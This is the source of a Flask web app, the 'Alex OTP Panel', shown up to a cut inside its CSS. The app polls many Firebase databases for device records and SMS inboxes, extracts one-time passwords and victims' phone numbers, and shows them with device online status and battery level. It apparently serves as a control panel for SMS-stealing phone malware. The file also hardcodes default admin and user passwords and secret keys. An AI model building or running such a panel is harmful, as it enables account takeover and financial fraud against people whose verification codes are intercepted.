
from flask import Flask, request, jsonify, session, redirect, url_for, Response
from functools import wraps
from pymongo import MongoClient
from bson import ObjectId
import requests
import os
import re
import json
import threading
import time
import hashlib
from collections import Counter
from datetime import datetime, timezone, timedelta

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "alex_otp_secret_2025_v23_3")

MONGO_URI = os.environ.get("MONGO_URI", "")
BG_REFRESH_INTERVAL = 60
MESSAGE_CACHE_TTL = 10
MAX_SMS_PER_NUMBER = 60
FETCH_TIMEOUT = 10
FAST_FETCH_TIMEOUT = 10
MAX_PARALLEL = 15
MAX_DEVICES_PER_FB = 300
IST = timezone(timedelta(hours=5, minutes=30))

FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "alex_fb_secure_salt_2025_v23")

MONGO_OK = False
mongo_client = None
db = None
fb_collection = None
settings_collection = None


def fb_hash(url):
    return hashlib.sha256((FB_HASH_SALT + url.rstrip("/")).encode()).hexdigest()[:16]


def init_mongo():
    global MONGO_OK, mongo_client, db, fb_collection, settings_collection
    try:
        mongo_client = MongoClient(
            MONGO_URI,
            serverSelectionTimeoutMS=8000,
            connectTimeoutMS=8000,
            socketTimeoutMS=8000,
            maxPoolSize=50,
        )
        db = mongo_client["otp_panel"]
        fb_collection = db["firebases"]
        settings_collection = db["settings"]
        mongo_client.admin.command("ping")
        MONGO_OK = True
        print("MongoDB connected")
    except Exception as e:
        MONGO_OK = False
        print(f"MongoDB: {e}")


init_mongo()

DEFAULT_USER_PWD = "User@2025"
DEFAULT_ADMIN_PWD = "Admin@2025"


def get_pwd(role):
    if not MONGO_OK:
        return DEFAULT_USER_PWD if role == "user" else DEFAULT_ADMIN_PWD
    try:
        doc = settings_collection.find_one({"_id": f"{role}_password"})
        if doc and doc.get("value"):
            return doc["value"]
    except Exception:
        pass
    return DEFAULT_USER_PWD if role == "user" else DEFAULT_ADMIN_PWD


def set_pwd(role, value):
    if not MONGO_OK:
        return False
    try:
        settings_collection.update_one(
            {"_id": f"{role}_password"},
            {"$set": {"value": value, "updated_at": int(time.time())}},
            upsert=True,
        )
        return True
    except Exception as e:
        print(f"set_pwd error: {e}")
        return False


cache = {
    "numbers_map": {},
    "devices": {},
    "device_messages": {},
    "msg_cache_time": {},
    "stats": {"total": 0, "online": 0, "offline": 0, "otp_rate": 0},
    "last_update": 0,
    "loading": False,
    "progress": {"done": 0, "total": 0},
    "lock": threading.Lock(),
    "inflight": set(),
    "inbox_locks": {},
    "otp_cache": {},
    "otp_cache_time": {},
    # ✅ Per-firebase stats cache
    "fb_stats": {},
    "fb_stats_time": 0,
}

MSG_FIELDS = {"message", "body", "text", "msg", "content", "messagetext", "messagebody", "sms", "smsbody", "smscontent", "smsbodytext", "lastmessage", "fullmessage", "sms_message", "msgbody"}
TIME_FIELDS = {"timestamp", "time", "date", "receivedtime", "datetime", "createdat", "senttime", "smstime", "devicetime", "date_time", "received_time", "sent_time", "sms_time", "device_time", "smsdate", "receivedat", "sentat", "lastmessagetime", "recvtime", "logtime", "event_time"}
SENT_KEYS = {"command", "commands", "sendsms", "action", "webhookevent", "send_sms", "sentsms", "outgoing"}
INCOMING_TYPES = {"incoming", "received", "inbox", "recv", "in"}


def digits_only(s):
    return re.sub(r"\D", "", str(s) if s is not None else "")


def normalize_number(n):
    d = digits_only(n)
    return d[-10:] if len(d) >= 10 else d


def extract_real_numbers_from_message(message):
    if not message:
        return []
    text = str(message)
    text = re.sub(r'\d{3,4}[Xx*]{2,6}\d{2,4}', ' ', text)
    found = []
    seen = set()
    for m in re.finditer(r'\+91[\s\-]?([6-9]\d{9})', text):
        num = m.group(1)
        if num not in seen:
            seen.add(num)
            found.append(num)
    for m in re.finditer(r'(?<!\d)([6-9]\d{9})(?!\d)', text):
        num = m.group(1)
        if num not in seen:
            seen.add(num)
            found.append(num)
    return found


def parse_date_string(s):
    if not s or not isinstance(s, str):
        return 0
    try:
        m = re.match(r"(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)", s.strip(), re.IGNORECASE)
        if not m:
            return 0
        day, month, year, hour, minute, ap = m.groups()
        hour = int(hour)
        if ap.lower() == "pm" and hour != 12:
            hour += 12
        if ap.lower() == "am" and hour == 12:
            hour = 0
        dt = datetime(int(year), int(month), int(day), hour, int(minute), tzinfo=IST)
        return int(dt.timestamp())
    except Exception:
        return 0


def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
    if found is None:
        found = []
    if depth > 10:
        return found
    pk_lower = parent_key.lower()
    if any(k in pk_lower for k in SENT_KEYS):
        return found
    if isinstance(obj, dict):
        kl = {k.lower() for k in obj.keys()}
        has_body = bool(kl & MSG_FIELDS)
        if has_body:
            def get_any(fs):
                for k in obj.keys():
                    if k.lower() in fs:
                        return obj[k]
                return None
            body = get_any(MSG_FIELDS)
            from_val = None
            for k in obj.keys():
                kl2 = k.lower()
                if kl2 in ("sender", "from", "origin", "address", "src"):
                    v = obj[k]
                    if v and isinstance(v, str) and v.strip():
                        from_val = v.strip()
                        break
            to_val = None
            for k in obj.keys():
                if k.lower() in ("to", "destination", "receiver"):
                    to_val = obj[k]
                    break
            date_str = None
            for k in obj.keys():
                kl2 = k.lower()
                if kl2 in ("datetime", "date_time", "date", "datetimestr"):
                    v = obj[k]
                    if isinstance(v, str) and ("|" in v or "am" in v.lower() or "pm" in v.lower()):
                        date_str = v
                        break
            msg_id = obj.get("id")
            ts = 0
            if date_str:
                ts = parse_date_string(date_str)
            if not ts:
                ts_raw = get_any(TIME_FIELDS)
                if ts_raw:
                    try:
                        ts = int(ts_raw)
                        if ts > 1e12:
                            ts = ts // 1000
                    except Exception:
                        ts = 0
            if not ts and msg_id:
                try:
                    mid = int(msg_id)
                    if mid > 1e12:
                        ts = mid // 1000
                    elif mid > 1e9:
                        ts = mid
                except Exception:
                    pass
            if not ts:
                ts = parent_ts
            msg_type = str(obj.get("type", "")).lower().strip()
            is_sended = obj.get("isSended") if "isSended" in obj else obj.get("isSent")
            keep = False
            if msg_type in INCOMING_TYPES:
                keep = True
            elif msg_type in ("sent", "outgoing"):
                keep = False
            elif is_sended is True:
                keep = False
            elif is_sended is False:
                keep = True
            elif from_val and not to_val:
                keep = True
            elif to_val and not from_val:
                keep = False
            elif not to_val and not from_val:
                keep = True
            else:
                keep = False
            if keep and body:
                display_from = from_val if from_val else "Unknown"
                found.append({
                    "from": str(display_from) if display_from else "Unknown",
                    "to": str(to_val) if to_val else "",
                    "message": str(body),
                    "timestamp": ts,
                    "date_string": date_str,
                    "id": msg_id,
                    "type": "received",
                })
        for k, v in obj.items():
            kl2 = k.lower()
            if any(x in kl2 for x in SENT_KEYS):
                continue
            child_ts = parent_ts
            try:
                tk = int(k)
                if tk > 1e12:
                    child_ts = tk // 1000
                elif tk > 1e9:
                    child_ts = tk
            except Exception:
                pass
            collect_all_messages(v, found, depth + 1, child_ts, k)
    elif isinstance(obj, list):
        for item in obj:
            collect_all_messages(item, found, depth + 1, parent_ts, parent_key)
    return found


def extract_otp(text):
    if not text:
        return ""
    m = re.search(r"(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})", text, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)", text, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"#(\d{4,8})", text)
    if m:
        return m.group(1)
    return ""


def is_online(info):
    if not isinstance(info, dict):
        return False
    if info.get("status") is True:
        return True
    if info.get("isOnline") is True:
        return True
    if info.get("online") is True:
        return True
    if info.get("connected") is True:
        return True
    if info.get("status") in ("online", "active", 1):
        return True
    if info.get("lastSeen"):
        try:
            ls = int(info.get("lastSeen"))
            if time.time() - ls < 600:
                return True
        except Exception:
            pass
    return False


def find_real_number_from_messages(all_msgs):
    number_counter = Counter()
    sender_numbers = set()
    for m in all_msgs:
        sender = m.get("from", "")
        if sender:
            sender_nums = extract_real_numbers_from_message(sender)
            for sn in sender_nums:
                sender_numbers.add(sn)
    for m in all_msgs:
        if m.get("type") != "received":
            continue
        msg_text = m.get("message", "")
        nums = extract_real_numbers_from_message(msg_text)
        for n in nums:
            if n in sender_numbers:
                continue
            if n.startswith(("1800", "1900", "1991")):
                continue
            number_counter[n] += 1
    return number_counter.most_common(10)


def _finalize_device(name, online, sims, msgs, dev_data):
    seen_m = set()
    unique = []
    for m in msgs:
        h = f"{m.get('from', '')}|{m.get('message', '')[:80]}|{m.get('timestamp', 0)}"
        if h in seen_m:
            continue
        seen_m.add(h)
        unique.append(m)
    unique.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    unique = unique[:MAX_SMS_PER_NUMBER]
    per_number = {n["number"]: [] for n in sims}
    if sims:
        first_num = sims[0]["number"]
        per_number[first_num] = unique[:]
    for num in per_number:
        per_number[num].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
        per_number[num] = per_number[num][:MAX_SMS_PER_NUMBER]
    total_otp = sum(1 for m in unique if extract_otp(m.get("message", "")))
    return {
        "name": name, "online": online, "sims": sims,
        "battery": dev_data.get("battery", 0) if isinstance(dev_data, dict) else 0,
        "messages": unique,
        "per_number": per_number,
        "total_msgs": len(unique), "total_otp": total_otp,
    }


_thread_local = threading.local()


def _get_session():
    if not hasattr(_thread_local, "session"):
        s = requests.Session()
        s.headers.setdefault("User-Agent", "Mozilla/5.0")
        _thread_local.session = s
    return _thread_local.session


def try_json(url, timeout=FETCH_TIMEOUT):
    try:
        r = _get_session().get(url, timeout=timeout)
        if r.status_code != 200:
            return None
        t = r.text.strip()
        if not t or t == "null":
            return None
        return json.loads(t)
    except Exception:
        return None


def fetch_device_ids(fb_url):
    base = fb_url.rstrip("/")
    for path in ["/clients.json?shallow=true", "/clients.json", "/devices.json?shallow=true", "/devices.json"]:
        data = try_json(base + path)
        if isinstance(data, dict):
            return list(data.keys())
    return []


def fetch_device_data(fb_url, dev_id):
    base = fb_url.rstrip("/")
    for p in [f"/clients/{dev_id}.json", f"/devices/{dev_id}.json", f"/{dev_id}.json"]:
        data = try_json(base + p)
        if isinstance(data, dict):
            return data
    return None


def fetch_messages_multi_path(fb_url, dev_id, phone_numbers=None):
    base = fb_url.rstrip("/")
    all_msgs = []
    seen = set()
    url = f'{base}/messages/{dev_id}.json?orderBy="$key"&limitToLast=60'
    data = try_json(url, timeout=FAST_FETCH_TIMEOUT)
    if not data:
        url = f'{base}/messages/{dev_id}.json'
        data = try_json(url, timeout=30)
    if data and isinstance(data, dict):
        msgs = collect_all_messages(data)
        for m in msgs:
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h in seen:
                continue
            seen.add(h)
            all_msgs.append(m)
    all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    return all_msgs[:MAX_SMS_PER_NUMBER]


def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
    out = []
    device_ids = fetch_device_ids(fb_url)
    if len(device_ids) > MAX_DEVICES_PER_FB:
        device_ids = device_ids[:MAX_DEVICES_PER_FB]
    for did in device_ids:
        raw = fetch_device_data(fb_url, did)
        if not raw:
            continue
        msgs = fetch_messages_multi_path(fb_url, did, phone_numbers=None)
        if raw:
            inner_msgs = collect_all_messages(raw)
            existing = set()
            for m in msgs:
                h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
                existing.add(h)
            for m in inner_msgs:
                h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
                if h not in existing:
                    msgs.append(m)
                    existing.add(h)
            msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
            msgs = msgs[:MAX_SMS_PER_NUMBER]
        online = is_online(raw)
        name = did[:16]
        for f in ["deviceName", "device_name", "name", "model", "deviceModel", "brand", "manufacturer", "phoneName", "phoneModel", "deviceInfo", "productName", "hardware", "deviceBrand"]:
            v = raw.get(f) if isinstance(raw, dict) else None
            if v and isinstance(v, str) and v.strip():
                name = v.strip()[:25]
                break
        top_candidates = find_real_number_from_messages(msgs)
        sims = []
        if top_candidates:
            real_number = top_candidates[0][0]
            count = top_candidates[0][1]
            sims = [{"slot": 0, "number": real_number, "online": online, "confidence": count}]
        else:
            sims = [{"slot": 0, "number": "UNKNOWN-" + did[:6], "online": online, "confidence": 0}]
        dev = _finalize_device(name, online, sims, msgs, raw)
        dev["id"] = did
        dev["firebase"] = fb_url
        dev["fb_name"] = fb_name
        dev["fb_id"] = fb_id
        out.append(dev)
    return out


def merge_numbers_into_cache(devices):
    with cache["lock"]:
        for dev in devices:
            is_dev_online = dev.get("online", False)
            for sim in dev.get("sims", []):
                num = sim["number"]
                if num.startswith("UNKNOWN-"):
                    key = num
                else:
                    key = normalize_number(num)
                    if not key or len(key) != 10:
                        continue
                msgs = dev.get("per_number", {}).get(num, [])
                otp_count = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                if key not in cache["numbers_map"]:
                    cache["numbers_map"][key] = {
                        "number": num, "device_id": dev["id"], "device_name": dev.get("name", ""),
                        "firebase": dev.get("firebase", ""), "fb_id": dev.get("fb_id", ""),
                        "fb_name": dev.get("fb_name", ""), "online": is_dev_online,
                        "msg_count": len(msgs), "otp_count": otp_count,
                        "battery": dev.get("battery", "?"),
                        "confidence": sim.get("confidence", 0),
                    }
                else:
                    existing = cache["numbers_map"][key]
                    if sim.get("confidence", 0) > existing.get("confidence", 0):
                        existing["number"] = num
                        existing["confidence"] = sim.get("confidence", 0)
                    if len(msgs) > existing["msg_count"]:
                        existing["device_id"] = dev["id"]
                        existing["device_name"] = dev.get("name", "")
                        existing["firebase"] = dev.get("firebase", "")
                        existing["fb_id"] = dev.get("fb_id", "")
                        existing["fb_name"] = dev.get("fb_name", "")
                        existing["msg_count"] = len(msgs)
                        existing["otp_count"] = otp_count
                        existing["online"] = is_dev_online
                    elif is_dev_online and not existing["online"]:
                        existing["online"] = True
            cache["devices"][f"{dev['firebase']}|{dev['id']}"] = dev
        nums = list(cache["numbers_map"].values())
        online = sum(1 for n in nums if n.get("online"))
        offline = len(nums) - online
        total_otp = sum(n.get("otp_count", 0) for n in nums)
        total_msg = sum(n.get("msg_count", 0) for n in nums)
        otp_rate = int((total_otp / total_msg) * 100) if total_msg > 0 else 0
        cache["stats"] = {"total": len(nums), "online": online, "offline": offline, "otp_rate": otp_rate}


# ✅ Per-firebase stats fetch (admin ke liye)
def fetch_fb_stats():
    if not MONGO_OK:
        return
    try:
        firebases = list(fb_collection.find({}))
    except Exception:
        return
    results = {}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            fb_id = str(fb.get("_id", ""))
            if not url:
                results[fb_id] = {"online": 0, "offline": 0, "devices": 0}
                return
            try:
                devices = fetch_devices_from_one_fb(url, fb.get("name", ""), fb_id)
                online = sum(1 for d in devices if d.get("online"))
                offline = len(devices) - online
                results[fb_id] = {"online": online, "offline": offline, "devices": len(devices)}
            except Exception as e:
                print(f"fb_stats worker error {url}: {e}")
                results[fb_id] = {"online": 0, "offline": 0, "devices": 0}

    threads = []
    for fb in firebases:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=90)

    with cache["lock"]:
        cache["fb_stats"] = results
        cache["fb_stats_time"] = time.time()


def fetch_all_devices():
    if not MONGO_OK:
        return
    try:
        firebases = list(fb_collection.find({}))
    except Exception:
        return
    with cache["lock"]:
        cache["progress"] = {"done": 0, "total": len(firebases)}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            if not url:
                with cache["lock"]:
                    cache["progress"]["done"] += 1
                return
            try:
                devs = fetch_devices_from_one_fb(url, fb.get("name", ""), str(fb.get("_id", "")))
                merge_numbers_into_cache(devs)
            except Exception as e:
                print(f"worker error {url}: {e}")
            with cache["lock"]:
                cache["progress"]["done"] += 1

    threads = []
    for fb in firebases:
        t = threading.Thread(target=worker, args=(fb,), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=120)


def refresh_cache():
    with cache["lock"]:
        if cache["loading"]:
            return
        cache["loading"] = True
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
    try:
        fetch_all_devices()
        fetch_fb_stats()
        with cache["lock"]:
            cache["last_update"] = time.time()
    except Exception as e:
        print(f"Refresh error: {e}")
    finally:
        with cache["lock"]:
            cache["loading"] = False


def bg_refresher():
    time.sleep(5)
    while True:
        try:
            refresh_cache()
        except Exception as e:
            print(f"BG: {e}")
        time.sleep(BG_REFRESH_INTERVAL)


threading.Thread(target=bg_refresher, daemon=True).start()


def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("logged_in"):
            if request.path.startswith("/api/"):
                return jsonify({"success": False, "error": "Login required"}), 401
            return redirect(url_for("login_page"))
        return f(*args, **kwargs)
    return wrapper


def admin_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("logged_in") or session.get("role") != "admin":
            if request.path.startswith("/api/"):
                return jsonify({"success": False, "error": "Admin required"}), 401
            return redirect(url_for("admin_login_page"))
        return f(*args, **kwargs)
    return wrapper


MOBILE_CSS = """
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,system-ui,sans-serif}
html,body{overscroll-behavior-y:contain}
body{padding-bottom:env(safe-area-inset-bottom)}
input,button,textarea,select{font-size:16px !important;-webkit-appearance:none;border-radius:12px}
button{touch-action:manipulation;cursor:pointer}
a{-webkit-tap-highlight-color:transparent}
"""

# ==================== LOGIN PAGES ====================
LOGIN_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Alex OTP Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#7c3aed">
<style>""" + MOBILE_CSS + """
body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#f0f9ff,#e0e7ff);color:#1e293b;padding:20px}
.box{width:100%;max-width:400px;background:#fff;border-radius:20px;padding:32px 24px;box-shadow:0 20px 60px rgba(99,102,241,.15)}
h1{text-align:center;font-size:22px;margin-bottom:8px;background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
p.sub{text-align:center;font-size:13px;color:#64748b;margin-bottom:24px}
.pwd-wrap{position:relative}
input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#f8fafc;color:#1e293b;outline:none;transition:.2s}
input:focus{border-color:#8b5cf6;background:#fff;box-shadow:0 0 0 4px rgba(139,92,246,.1)}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:20px;user-select:none;color:#94a3b8;padding:4px}
button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;font-weight:600;font-size:16px;cursor:pointer;transition:.2s;min-height:52px}
button:active{transform:scale(.98)}
.err{margin-top:14px;text-align:center;color:#ef4444;font-size:13px}
.lock{text-align:center;font-size:40px;margin-bottom:12px}</style></head><body>
<form class="box" method="POST"><div class="lock">📲</div><h1>ALEX OTP PANEL</h1>
<p class="sub">Enter password to continue</p>
<div class="pwd-wrap">
<input type="password" id="pwd" name="password" placeholder="Password" required autofocus>
<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
</div>
<button type="submit">Login</button>__ERROR__</form>
<script>
function togglePwd(e){
  var i=document.getElementById('pwd');
  var t=e.target;
  if(i.type==='password'){i.type='text';t.textContent='🙈';}
  else{i.type='password';t.textContent='👁️';}
}
</script>
</body></html>"""

ADMIN_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Alex Admin Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#1e293b">
<style>""" + MOBILE_CSS + """
body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1e293b,#0f172a);color:#e2e8f0;padding:20px}
.box{width:100%;max-width:400px;background:#1e293b;border:1px solid #334155;border-radius:20px;padding:32px 24px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
h1{text-align:center;font-size:22px;margin-bottom:8px;background:linear-gradient(90deg,#f59e0b,#ef4444);-webkit-background-clip:text;background-clip:text;color:transparent}
p.sub{text-align:center;font-size:13px;color:#94a3b8;margin-bottom:24px}
.pwd-wrap{position:relative}
input{width:100%;padding:16px 48px 16px 16px;border-radius:12px;border:1.5px solid #334155;background:#0f172a;color:#e2e8f0;outline:none;transition:.2s}
input:focus{border-color:#f59e0b;box-shadow:0 0 0 4px rgba(245,158,11,.15)}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:20px;user-select:none;color:#94a3b8;padding:4px}
button{width:100%;margin-top:16px;padding:16px;border:none;border-radius:12px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;font-weight:600;font-size:16px;cursor:pointer;transition:.2s;min-height:52px}
button:active{transform:scale(.98)}
.err{margin-top:14px;text-align:center;color:#ef4444;font-size:13px}
.lock{text-align:center;font-size:40px;margin-bottom:12px}</style></head><body>
<form class="box" method="POST"><div class="lock">🔐</div><h1>ADMIN PANEL</h1>
<p class="sub">Enter admin password</p>
<div class="pwd-wrap">
<input type="password" id="pwd" name="password" placeholder="Admin Password" required autofocus>
<span class="toggle-pwd" onclick="togglePwd(event)">👁️</span>
</div>
<button type="submit">Admin Login</button>__ERROR__</form>
<script>
function togglePwd(e){
  var i=document.getElementById('pwd');
  var t=e.target;
  if(i.type==='password'){i.type='text';t.textContent='🙈';}
  else{i.type='password';t.textContent='👁️';}
}
</script>
</body></html>"""


# ==================== USER DASHBOARD ====================
USER_DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Alex OTP Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#7c3aed">
<style>""" + MOBILE_CSS + r"""
body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
.brand{font-size:17px;font-weight:800;letter-spacing:-.5px;flex-shrink:0}
.brand .alex{background:linear-gradient(90deg,#7c3aed,#ec4899);-webkit-background-clip:text;background-clip:text;color:transparent}
.brand .panel{color:#1e293b}
.top-actions{display:flex;align-items:center;gap:8px}
.refresh-btn{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(124,58,237,.3);transition:.2s;padding:0}
.refresh-btn:active{transform:scale(.9) rotate(180deg)}
.refresh-btn.spinning{animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
.conn.online{color:#16a34a;background:#dcfce7}
.conn.offline{color:#dc2626;background:#fee2e2}
.conn.loading{color:#d97706;background:#fef3c7}
.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
.conn.online .dot{animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.logout-btn{background:#f1f5f9;color:#ef4444;border:none;padding:10px 12px;border-radius:10px;font-size:12px;font-weight:600;text-decoration:none;min-height:42px;display:inline-flex;align-items:center}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
@media(min-width:640px){.nav{order:0;width:auto}}
.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:13px;font-weight:600;color:#475569;background:#f1f5f9;transition:.2s;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center}
.nav-link:active{transform:scale(.96)}
.nav-link.active{background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff}
.nav-link.otp{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534}
.container{max-width:900px;margin:0 auto;padding:14px}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
.stat{background:#fff;border-radius:14px;padding:14px;box-shadow:0 2px 8px rgba(99,102,241,.06);transition:.3s}
.stat.flash{background:#f0fdf4}
.stat .label{font-size:10px;color:#94a3b8;font-weight:600;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px}
.stat .value{font-size:26px;font-weight:800;letter-spacing:-1px}
.stat.total .value{color:#2563eb}
.stat.online .value{color:#16a34a}
.stat.offline .value{color:#dc2626}
.stat.otp .value{color:#a855f7}
.quick{background:#fff;border-radius:14px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 8px rgba(99,102,241,.06);flex-wrap:wrap;gap:10px}
.quick .info{font-size:13px;color:#475569}
.quick .info b{color:#1e293b;font-size:15px}
.filter-live{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
.filter-live-btn{flex:1;min-width:130px;padding:14px 12px;border-radius:12px;border:2px solid transparent;cursor:pointer;font-size:13px;font-weight:700;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:6px;transition:.2s;background:none;font-family:inherit;min-height:52px}
.filter-live-btn:active{transform:scale(.97)}
.filter-live-btn.online{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;border-color:#86efac}
.filter-live-btn.offline{background:linear-gradient(135deg,#fee2e2,#fecaca);color:#991b1b;border-color:#fca5a5}
.filter-live-btn.active-filter{box-shadow:0 0 0 4px rgba(99,102,241,.3)}
.filter-live-btn .count-badge{background:rgba(0,0,0,.15);padding:2px 8px;border-radius:10px;font-size:11px}
.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding:0 4px;gap:8px;flex-wrap:wrap}
.list-header h2{font-size:14px;font-weight:700;color:#334155}
.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
.search-box{margin-bottom:12px}
.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
.search-box input:focus{border-color:#8b5cf6}
.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:.15s;box-shadow:0 2px 6px rgba(99,102,241,.05);min-height:70px}
.num-card:active{transform:scale(.98);background:#fafafa}
.num-card.offline{opacity:0.85}
.num-icon{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:linear-gradient(135deg,#dcfce7,#bbf7d0)}
.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
.num-info{flex:1;min-width:0}
.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.num-title.unknown{color:#94a3b8;font-style:italic}
.num-title .confidence-badge{font-size:10px;background:#dcfce7;color:#166534;padding:2px 6px;border-radius:8px;margin-left:4px;font-weight:700}
.num-title .confidence-badge.low{background:#fef3c7;color:#92400e}
.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a;box-shadow:0 0 0 3px rgba(22,163,74,.15)}
.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626;box-shadow:0 0 0 3px rgba(220,38,38,.15)}
.arrow{color:#cbd5e1;font-size:20px}
.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0;padding:0}
.back-btn:active{transform:scale(.9)}
.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
.inbox-num.unknown{color:#94a3b8;font-style:italic}
.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a;box-shadow:0 0 0 4px rgba(22,163,74,.15)}
.inbox-status.offline{color:#dc2626}
.inbox-status.offline .dot{background:#dc2626;box-shadow:0 0 0 4px rgba(220,38,38,.15)}
.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center;gap:8px}
